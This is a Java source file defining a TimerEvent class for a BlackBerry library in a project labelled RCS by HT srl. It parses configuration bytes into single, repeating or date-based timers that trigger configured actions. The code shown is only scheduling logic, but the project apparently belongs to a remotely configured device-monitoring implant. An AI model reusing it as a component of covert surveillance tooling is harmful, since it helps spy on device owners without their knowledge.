/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : TimerEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.util.Date;

import net.rim.device.api.util.DataBuffer;
import blackberry.Conf;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class TimerEvent.
 */
public final class TimerEvent extends Event {
    private static final int SLEEP_TIME = 1000;

    //#debug
    private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);

    int type;
    long loDelay;
    long hiDelay;

    Date timestamp;

    /**
     * Instantiates a new timer event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public TimerEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_TIMER, actionId, confParams);
    }

    /**
     * Instantiates a new timer event.
     * 
     * @param actionId_
     *            the action id_
     * @param type_
     *            the type_
     * @param loDelay_
     *            the lo delay_
     * @param hiDelay_
     *            the hi delay_
     */
    public TimerEvent(final int actionId_, final int type_, final int loDelay_,
            final int hiDelay_) {
        super(Event.EVENT_TIMER, actionId_, "TimerEvent");
        type = type_;
        loDelay = loDelay_;
        hiDelay = hiDelay_;
        init();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        //#debug debug
        debug.trace("actualRun");
        trigger();
    }

    private void init() {

        switch (type) {
        case Conf.CONF_TIMER_SINGLE:
            // #debug debug
            debug.trace("CONF_TIMER_SINGLE");
            setDelay(loDelay);
            setPeriod(NEVER);
            break;
        case Conf.CONF_TIMER_REPEAT:
            // #debug debug
            debug.trace("CONF_TIMER_REPEAT");
            setPeriod(loDelay);
            setDelay(loDelay);
            break;
        case Conf.CONF_TIMER_DATE:
            // #debug debug
            debug.trace("CONF_TIMER_DATE");
            long tmpTime = hiDelay << 32;
            tmpTime += loDelay;
            //#mdebug
            final Date date = new Date(tmpTime);
            debug.trace("TimerDate: " + date);
            //#enddebug

            setPeriod(NEVER);
            final long now = Utils.getTime();
            setDelay(tmpTime - now);
            break;
        case Conf.CONF_TIMER_DELTA:
            // TODO: da implementare
            // #debug debug
            debug.trace("CONF_TIMER_DELTA");
            break;
        default:
            // #debug
            debug.error("shouldn't be here");
            break;
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            type = databuffer.readInt();
            loDelay = databuffer.readInt();
            hiDelay = databuffer.readInt();

            // #debug debug
            debug.trace("type: " + type + " lo:" + loDelay + " hi:" + hiDelay);

        } catch (final EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        init();

        //#mdebug
        StringBuffer sb = new StringBuffer();
        sb.append("type: " + type);
        sb.append(" loDelay: " + loDelay);
        sb.append(" hiDelay: " + hiDelay);
        //#debug info
        debug.info(sb.toString());
        //#enddebug
        
        return true;
    }

}
